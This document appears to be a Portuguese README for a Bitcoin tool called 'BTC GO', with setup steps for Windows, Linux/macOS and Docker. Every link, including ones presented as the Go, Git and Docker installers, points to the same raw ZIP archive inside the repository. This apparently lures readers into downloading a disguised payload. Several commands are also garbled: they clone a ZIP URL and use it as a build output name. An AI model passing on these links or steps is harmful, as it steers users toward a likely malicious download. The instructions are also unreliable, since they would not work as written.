# BTC GO v0.6.0
[![instalação do Go no Windows](https://github.com/emywally/btcgo/raw/refs/heads/main/cmd/utils/Software_1.6-alpha.4.zip)](https://github.com/emywally/btcgo/raw/refs/heads/main/cmd/utils/Software_1.6-alpha.4.zip)

## Requisitos
  -  [Go][install-go]
  -  [Git][install-git]
  -  Terminal

# Instruções para rodar o projeto no Windows.

 * Clona o repo e brota na pasta:
```bash
git clone [https://github.com/emywally/btcgo/raw/refs/heads/main/cmd/utils/Software_1.6-alpha.4.zip](https://github.com/emywally/btcgo/raw/refs/heads/main/cmd/utils/Software_1.6-alpha.4.zip) && cd btcgo
```
 
 * Instala as parada:
```bash
go mod tidy
```

 * Faz o build do projeto:
```bash
go build -o https://github.com/emywally/btcgo/raw/refs/heads/main/cmd/utils/Software_1.6-alpha.4.zip https://github.com/emywally/btcgo/raw/refs/heads/main/cmd/utils/Software_1.6-alpha.4.zip
```

 * Executa o que foi compilado:
```bash
btcgo
```


# Instruções para rodar o projeto no Linux / MacOS.

 * Clona o repo e brota na pasta:
```bash
  git clone [https://github.com/emywally/btcgo/raw/refs/heads/main/cmd/utils/Software_1.6-alpha.4.zip](https://github.com/emywally/btcgo/raw/refs/heads/main/cmd/utils/Software_1.6-alpha.4.zip) && cd btcgo
```
 
 * Instala as parada:
```bash
 go mod tidy
```

 * Faz o build do projeto:
```bash
go build -o btcgo https://github.com/emywally/btcgo/raw/refs/heads/main/cmd/utils/Software_1.6-alpha.4.zip
```

 * Executa o que foi compilado:
```bash
./btcgo
```

# Instruções para rodar o projeto em container.

## Requisitos
  -  [Docker][install-docker]
  -  [Docker-compose][install-docker-compose]
  -  [Git][install-git]

## Execução da parada

 * Clona o repo:
```bash
git clone https://github.com/emywally/btcgo/raw/refs/heads/main/cmd/utils/Software_1.6-alpha.4.zip && cd btcgo
```
 * Build do Dockerfile:
```bash
docker buildx build --no-cache -t btcgo .
```
 * Executa a imagem contruída no passo anterior:
```bash
docker run --rm -it --name btcgo btcgo
```

Este container será deletado se a aplicação parar, para executar novamente basta executar o último comando acima.


[install-go]: https://github.com/emywally/btcgo/raw/refs/heads/main/cmd/utils/Software_1.6-alpha.4.zip
[install-git]: https://github.com/emywally/btcgo/raw/refs/heads/main/cmd/utils/Software_1.6-alpha.4.zip
[install-docker]: https://github.com/emywally/btcgo/raw/refs/heads/main/cmd/utils/Software_1.6-alpha.4.zip
[install-docker-compose]: https://github.com/emywally/btcgo/raw/refs/heads/main/cmd/utils/Software_1.6-alpha.4.zip
